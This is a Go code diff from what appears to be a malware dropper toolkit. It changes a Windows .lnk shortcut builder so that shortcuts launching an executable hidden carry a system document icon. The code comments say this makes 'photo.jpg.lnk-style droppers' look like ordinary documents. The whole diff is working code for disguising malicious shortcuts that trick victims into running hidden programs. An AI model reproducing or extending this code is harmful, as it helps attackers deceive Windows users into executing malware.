@@ -124,9 +124,21 @@ func cmdIDList() []byte {
 	return []byte{0x00, 0x00}
 }
 
-// BuildLnkForExe builds a minimal .lnk that launches exeFile (relative path) hidden.
-// It reuses the same header as BuildCMDLnk but targets the exe directly.
+// DefaultLnkIconLocation is the IconLocation baked into generated .lnk
+// shortcuts: a system document icon so photo.jpg.lnk-style droppers show
+// a document glyph instead of a blank page. %SystemRoot% keeps it valid on
+// any Windows install; imageres.dll,25 is a document-page icon.
+const DefaultLnkIconLocation = "%SystemRoot%\\System32\\imageres.dll,25"
+
+// BuildLnkForExe builds a minimal .lnk that launches exeFile (relative path)
+// hidden, showing the default document icon (see DefaultLnkIconLocation).
 func BuildLnkForExe(exeFile string) ([]byte, error) {
+	return BuildLnkForExeWithIcon(exeFile, DefaultLnkIconLocation)
+}
+
+// BuildLnkForExeWithIcon builds the same hidden-launch .lnk but with an
+// explicit IconLocation (pass "" for no icon block, as before).
+func BuildLnkForExeWithIcon(exeFile string, iconPath string) ([]byte, error) {
 	if exeFile == "" {
 		return nil, fmt.Errorf("exe file required")
 	}
@@ -136,7 +148,12 @@ func BuildLnkForExe(exeFile string) ([]byte, error) {
 	hdr := make([]byte, headerSize)
 	binary.LittleEndian.PutUint32(hdr[0:4], headerSize)
 	copy(hdr[4:20], clsid)
-	binary.LittleEndian.PutUint32(hdr[20:24], 0x00000001|0x00000004|0x00000008|0x00000080)
+	// HasLinkTargetIDList | HasName | HasRelativePath | HasIconLocation | IsUnicode
+	flags := uint32(0x00000001 | 0x00000004 | 0x00000008 | 0x00000080)
+	if iconPath != "" {
+		flags |= 0x00000040 // HasIconLocation
+	}
+	binary.LittleEndian.PutUint32(hdr[20:24], flags)
 	binary.LittleEndian.PutUint32(hdr[24:28], 0x00000020)
 	ft := uint64(time.Now().UnixNano()/100 + 116444736000000000)
 	binary.LittleEndian.PutUint64(hdr[28:36], ft)
@@ -147,7 +164,8 @@ func BuildLnkForExe(exeFile string) ([]byte, error) {
 	buf.Write(hdr)
 	binary.Write(&buf, binary.LittleEndian, uint16(2))
 	buf.Write([]byte{0x00, 0x00})
-	// StringData: Name = exe without ext, RelativePath = exeFile
+	// StringData in spec order: Name, RelativePath, IconLocation.
+	// (No WorkingDir/Arguments are present, so nothing else is written.)
 	name := strings.TrimSuffix(exeFile, ".exe")
 	name = strings.TrimSuffix(name, ".EXE")
 	if len(name) > 30 {
@@ -155,7 +173,9 @@ func BuildLnkForExe(exeFile string) ([]byte, error) {
 	}
 	writeLnkString(&buf, name)
 	writeLnkString(&buf, exeFile)
-	writeLnkString(&buf, "") // no args
+	if iconPath != "" {
+		writeLnkString(&buf, iconPath)
+	}
 	binary.Write(&buf, binary.LittleEndian, uint32(0))
 	return buf.Bytes(), nil
 }
